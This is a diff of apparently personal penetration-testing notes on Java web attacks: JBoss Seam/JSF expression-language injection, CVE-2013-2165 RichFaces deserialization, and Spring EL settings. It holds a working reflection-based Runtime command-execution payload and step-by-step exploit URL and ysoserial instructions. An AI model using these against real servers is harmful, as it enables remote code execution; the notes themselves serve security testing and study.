@@ -205,7 +205,7 @@ https://github.com/SpiderLabs/deface.git (https://www.trustwave.com/Resources/Se
 POET
 Inyourface
 
-# jsf/seam
+# jboss seam / jsf
 * expression language injection via remote inclusion
 <body>
 <p>${"".getClass().forName('java.lang.Runtime').getDeclaredMethods()[14].invoke("".getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null), param.test)}</p>
@@ -234,8 +234,23 @@ line 708 is the first evaluation and line 710 will evaluate again
 
 forever vuln because not maintained anymore: https://github.com/seam2/jboss-seam/commit/965d4f3ea4dd527a41402f4758878de02d5ede7d
 
-# spring
-https://docs.google.com/document/d/1dc1xxO8UMFaGLOwgkykYdghGWm_2Gn0iCrxFsympqcE/edit
+* CVE-2013-2165 java deserialization in Richfaces 3.3.3Final // http://vnprogramming.com/index.php/2016/10/10/web500-hitconctf-2016-and-exploit-cve-2013-2165/
+vuln: in richfaces-impl-3.3.3.Final.jar:org.ajax4jsf.resource.ResourceBuilderImpl.class
+test: GET /jboss-seam-jpa/a4j/g/3_3_3.Finalorg/richfaces/renderkit/html/scripts/skinning.js (jpa is an example app in Jboss seam 2.2.1Final
+exploit: http://localhost:8082/jboss-seam-jpa/a4j/g/3_3_3.Finalorg/richfaces/renderkit/html/scripts/skinning.js/DATA/xxxxxxxxx
+Tomcat (or JBoss) detects prefix /a4j and routes request to Richfaces
+Richfaces uses ResourceBuilderImple to parse g/3_3_3.Finlaorg/richfaces/renderkit/html/scripts/skinning.js/DATA/xxxxxxxxx
+skips g/3.3.3.Final and grabs resource path org/richfaces/renderkit/html/scripts/skinning.js as well as descompress+deserialize the xxxxxxxxx after DATA/
+use ysoserial and compress+base64 encode to generate xxxxxxxxx
+
+# JSP Expression Language
+JSP EL is a specification, there are many implementations (e.g. OGNL in struts2/webwork, Spring SpEL, JBoss EL, MVEL)
+only since the JSP 2.0 specification has EL been available within JSP pages directly
+however, it can and has been used in non-view use cases
+https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf
+http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
+can be turned off since Spring 3.0.6 and above by setting the springJspExpressionSupport context parameter to false in web.xml
+turned off by default since Spring Framework 3.1 onwards when running on Servlet 3.0 or higher
 
 # jnlp
 download jar files from a jnlp file: https://code.google.com/p/jnlpdownloader/
